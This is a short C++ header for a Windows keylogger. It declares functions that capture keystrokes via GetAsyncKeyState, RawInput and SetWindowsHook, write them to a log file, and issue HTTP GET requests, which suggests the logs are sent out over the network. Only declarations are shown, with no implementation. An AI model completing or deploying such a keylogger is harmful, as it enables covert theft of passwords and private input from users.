#include <WinSock2.h>
#include <stdio.h>
#include <Windows.h>
#include <string>


#define SECURITY_WIN32
#include <schannel.h>
#include <security.h>


using namespace std;

#pragma warning (disable : 4996)
#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "Secur32.lib")

extern bool caps, numLk, scrLk;

void KeyLogger_GetAsyncKeyState();
void KeyLogger_RawInput();
void KeyLogger_SetWindowsHook();
void Log(char* input, const char fileName[] = "Log.txt");
bool LogKey(int key);
char* GET(char* URL);

